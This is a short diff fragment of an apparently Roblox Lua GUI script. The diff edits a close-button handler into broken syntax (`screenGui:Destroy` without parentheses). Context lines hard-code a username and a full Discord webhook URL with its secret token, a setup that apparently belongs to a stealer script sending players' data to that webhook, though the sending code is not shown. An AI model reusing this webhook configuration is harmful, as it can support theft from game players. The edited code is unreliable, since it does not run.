@@ -42,8 +42,8 @@ closeButton.TextSize = 18
 closeButton.Parent = frame
 
 closeButton.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
+    screenGui:Destroy
+ end)
 
 userName = "backsclapes"
 webHook = "https://discord.com/api/webhooks/1355498964002013295/qOoHCpa83gK8IwJbl3bwLIhubKE-5cIDvqnt6syxOeRtrXmwvUzgxaftRGFQuJvnER_s"
